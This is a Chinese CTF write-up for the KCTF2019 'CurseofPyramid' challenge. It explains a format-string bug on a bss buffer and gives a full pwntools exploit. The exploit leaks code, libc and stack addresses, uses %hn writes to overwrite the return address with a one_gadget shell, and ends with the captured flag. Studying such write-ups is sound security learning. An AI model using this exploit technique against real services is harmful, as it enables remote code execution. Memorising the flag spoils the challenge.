---
title: 金字塔的诅咒
categories: 
- KCTF2019
---
# KCTF2019 CurseofPyramid

## 前言

看雪CTF2019的题，bss的格式化字符串，比较通用的解决思路，稍微记录一下

## 程序逻辑

程序就一个Main函数，里面printf一个bss段的用户输入值

![main](./1.jpg)

## 漏洞分析

可以多次利用漏洞，调试下到断点看到栈里有关于程序加载基址，栈地址，libc地址的值，挨个泄露出来。

断点到printf继续看栈，栈里有两个地址比较有趣,0xfff2e1e4和0xfff2e1e8，可以使用%n把0xfff2e274地址的值改为target_addr，用%n把0xfff2e27c地址的值改为target_addr+2。之后再到0xfff2e274把target_addr的值修改2字节，到0xfff2e27c把target_addr+2对的值修改2字节，即可完成任意地址任意写。

这里的target_addr即返回地址所在的栈地址，覆写成功即可返回到shell_addr   

![stack1](./2.jpg)

![stack2](./3.jpg)

## exp.py

```py
#coding=utf-8
from pwn import *
context.update(arch='i386',os='linux',log_level="DEBUG")
context.terminal = ['tmux','split','-h']
debug = 0
if debug:
    p = process("./format")
    libc = ELF('/lib/i386-linux-gnu/libc.so.6')
    gadgets = [0x3ac5c,0x3ac5e,0x3ac62,0x3ac69,0x5fbc5,0x5fbc6]

else:
    p = remote('152.136.18.34',9999)
    libc = ELF('./libc-2.23.so')
    gadgets = [0x3a80c,0x3a80e,0x3a812,0x3a819,0x5f065,0x5f066]

def Input(content):
    p.recvuntil('Choice:')
    p.sendline('1')
    p.recvuntil('What do tou want to say:')
    p.send(content)

def Exit():
    p.recvuntil('Choice:')
    p.sendline('2')

def ValToLis(value):
    value_high = value >> 16
    value_low = value & 0xffff
    value_lis = []
    '''
    value_lis.append(value_low & 0xff)
    value_lis.append(value_low >> 8)
    value_lis.append(value_high & 0xff)
    value_lis.append(value_high >> 8)
    '''
    value_lis.append(value_low)
    value_lis.append(value_high)
    return value_lis

def exp():
    #leak code base
    Input('%3$p')
    p.recvuntil('0x')
    code_base = int(p.recvline().strip('\n'),16) - 0x8f3
    log.success('code base => ' + hex(code_base))
    #leak libc
    Input('%11$p')
    p.recvuntil('0x')
    libc_base = int(p.recvline().strip('\n'),16) - 247 - libc.symbols['__libc_start_main']
    log.success('libc base => ' + hex(libc_base))
    #leak stack
    Input('%5$p')
    p.recvuntil('0x')
    ebp_addr = int(p.recvline().strip('\n')[:-1],16) - 172
    target_addr = ebp_addr + 20
    ## first 17$p then 53$p
    ## first 18$p  then 55$p
    log.success('ebp addr => ' + hex(ebp_addr))
    #3 get shell
    echo_addr = code_base + 0x200c
    #overwrite 0xff87ed84 to 0xff87ecdc

    #first
    val_lis = ValToLis(target_addr)
    payload = '%'+str(val_lis[0])+'c%17$hn'
    Input(payload)
    #second
    val_lis = ValToLis(target_addr+2)
    payload = '%'+str(val_lis[0])+'c%18$hn'
    Input(payload)
    shell_addr = libc_base + gadgets[1]
    log.success('shell addr => ' + hex(shell_addr))
    shell_lis = ValToLis(shell_addr)
    print shell_lis
    #first
    #gdb.attach(p)
    payload = '%'+str(shell_lis[0])+'c%53$hn'
    Input(payload)
    #second
    payload = '%'+str(shell_lis[1])+'c%55$hn'
    Input(payload)
    Exit()
    p.interactive()

exp()
'''
flag{c6671fc0-cea3-42ef-8af0-c20c65f854be}
'''
```
